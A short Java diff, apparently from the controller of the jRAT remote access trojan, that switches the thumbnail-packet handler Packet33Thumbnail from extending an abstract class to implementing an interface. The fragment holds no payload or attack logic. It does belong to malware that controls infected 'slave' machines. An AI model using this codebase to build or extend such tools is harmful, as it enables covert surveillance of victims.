@@ -6,7 +6,7 @@ import jrat.controller.Slave;
 import javax.swing.*;
 import java.awt.image.BufferedImage;
 
-public class Packet33Thumbnail extends AbstractIncomingPacket {
+public class Packet33Thumbnail implements IncomingPacket {
 
 	@Override
 	public void read(Slave slave) throws Exception {
